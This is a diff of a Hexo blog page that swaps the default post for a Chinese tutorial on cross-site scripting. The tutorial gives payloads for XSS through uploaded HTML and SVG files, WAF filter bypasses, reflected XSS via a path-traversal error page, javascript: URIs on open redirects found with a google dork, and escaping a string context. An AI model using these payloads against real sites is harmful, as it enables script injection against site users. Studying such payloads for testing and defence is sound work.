@@ -15,17 +15,28 @@
   </script>
 
   
-  <title>Hello World | Hexo</title>
+  <title>XSS_2 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+  <meta name="description" content="文件上传XSS1.上传html文件 &amp;#8195;文件内容为xss的payload &amp;#8195;&amp;lt;svg&#x2F;onload=alert(1)&amp;gt; &amp;#8195;上传成功后去访问就会触发 2.上传svg文件 &amp;#8195;svg文件内容为： 123456&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot; standalo">
+<meta name="keywords" content="xss">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;25&#x2F;hello-world&#x2F;index.html">
+<meta property="og:title" content="XSS_2">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;03&#x2F;XSS_2&#x2F;index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="文件上传XSS1.上传html文件 &amp;#8195;文件内容为xss的payload &amp;#8195;&amp;lt;svg&#x2F;onload=alert(1)&amp;gt; &amp;#8195;上传成功后去访问就会触发 2.上传svg文件 &amp;#8195;svg文件内容为： 123456&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot; standalo">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-11-25T13:52:36.248Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xsschat.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xsschat2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssbc.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssbc2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssbc3.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssf.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssf1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssf2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xssf3.png">
+<meta property="og:updated_time" content="2019-12-03T04:05:33.967Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;xsschat.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -143,34 +154,81 @@
     <div class="container post-box">
         <div class="content post-title is-flex center flex-column" style="margin-bottom: 70px; overflow: auto;">
             <h1 class="has-text-centered" style="padding-bottom: 10px; border-bottom: 3px solid #fff">
-                <strong>Hello World</strong>
+                <strong>XSS_2</strong>
             </h1>
             
             <div class="is-flex align-center">
                 <img class="post-avatar" src="https://cdn2.iconfinder.com/data/icons/rcons-user/32/male-shadow-circle-512.png">
                 <span style="padding:0 10px;"> <span class="sub-title">By</span> Oldman</span>
-                <span class="post-date sub-title">at: 2019-11-25</span>
+                <span class="post-date sub-title">at: 2019-12-03</span>
             </div>
             
                 <div>
+                    
+                         <a class="tag is-post-tag" href="/tags/xss/">xss</a>
                     
                 </div>
             
         </div>
         <div class="content" style="overflow: auto">
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1312925425&auto=0&height=66"></iframe>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<h3 id="文件上传XSS"><a href="#文件上传XSS" class="headerlink" title="文件上传XSS"></a>文件上传XSS</h3><p>1.上传html文件</p>
+<p>&#8195;文件内容为xss的payload</p>
+<p>&#8195;<code>&lt;svg/onload=alert(1)&gt;</code></p>
+<p>&#8195;上传成功后去访问就会触发</p>
+<p>2.上传svg文件</p>
+<p>&#8195;svg文件内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>&#8195;同样只要能访问到就可以触发</p>
+<h2 id="案例分享"><a href="#案例分享" class="headerlink" title="案例分享"></a>案例分享</h2><p>1.一个有在线聊天的网站，发送的聊天内容为xss payload</p>
+<p><img src="/images/xsschat.png" alt="xsschat"></p>
+<p><img src="/images/xsschat2.png" alt="xsschat"></p>
+<p>2.绕过XSS filter</p>
+<p>&#8195;当输入简单的payload:</p>
+<p>&#8195;<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p>&#8195;发现请求被WAF阻止，经过各种尝试发现，当输入：</p>
+<p>&#8195;<code>o&lt;x&gt;nmouseover=alert&lt;x&gt;1//</code></p>
+<p>&#8195;尖括号与之间的内容被删除，仅剩下<code>onmouseover=alert(1)//</code>并弹出一个xss</p>
+<p>&#8195;这个案例的话就是测试一下waf会对我们输入的内容怎么处理，根据处理方式进行一种利用，进而绕过，当我们遇到一个xss点，一定要多尝试，不要输入俩payload就觉得服务器已经防的死死的，多尝试，多研究，终会绕过的。</p>
+<p>3.错误页面反应的XSS</p>
+<p>&#8195;假设我们现在访问了一段url</p>
+<p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=../../../../etc/passwd</code></p>
+<p>&#8195;出现了以下错误页面</p>
+<p><img src="/images/xssbc.png" alt="xssbc"></p>
+<p>&#8195;我们可以发现，url中file=后面的内容在页面中显示了出来</p>
+<p>&#8195;我们接着尝试插入html标记，测试一下有没有filter</p>
+<p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=&lt;h1&gt;asu</code></p>
+<p><img src="/images/xssbc2.png" alt="xssbc"></p>
+<p>&#8195;很显然，并没有filter,我们只需插入xss payload就可以了</p>
+<p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=&lt;img src=x onmouseover=alert(1)&gt;</code></p>
+<p><img src="/images/xssbc3.png" alt="xssbc"></p>
+<p>4.url的xss与google dork的故事</p>
+<p>&#8195;假设目标网站是<code>www.example.com</code>，我们使用google <code>site:*.example.com inurl:redirect</code></p>
+<p>&#8195;当我们找到名为<code>example.com/social?redirect=/somewhere</code>时可以尝试<code>Open redirect</code>或XSS</p>
+<p>&#8195;当重定向到白名单url成功后，就可以尝试xss：<code>example.com/social?redirect=javascript://alert(1)</code>,访问后可能会重定向别的地方，按正常用户流程走，可能会触发xss</p>
+<p>&#8195;这个案例就是说我们拿到一个网站后，用google dork一下，发现open redirect 的点后，就在redirect后面添加</p>
+<p>&#8195;简单的javascript urI：<code>javascript://alert(1)</code>去尝试一下。</p>
+<p>5.绕过filter</p>
+<p>&#8195;当网站把<code>&quot;&quot;</code>过滤为<code>&quot;</code>,把<code>&gt;</code>过滤为<code>&amp;gt</code>，我们的payload中就不能使用符号<code>&quot; &lt; &gt;</code></p>
+<p>&#8195;我们就得一点点尝试，然后看<code>response</code>什么样，根据响应结果来修改payload</p>
+<p>&#8195;当payload:时</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a=&apos;)&#125;hello&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+
+<p><img src="/images/xssf.png" alt="xssf"></p>
+<p>&#8195;当payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a=1′)&#125;%0Aelse&#123;%0Aalert(‘XSS’);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/xssf1.png" alt="xssf"></p>
+<p>&#8195;这里没有触发是因为<code>&#39;)</code>未闭合，所有我们再修改一下payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a= 1′)&#125;%0Aelse&#123;%0Aalert(‘XSS’);(‘</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/xssf2.png" alt="xssf"></p>
+<p><img src="/images/xssf3.png" alt="xssf"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是内句话，遇到waf要多尝试，1小时不行就2小时，2小时不行就3小时，不要随便试试就放弃</p>
 
         </div>
         <div class="post-reply">
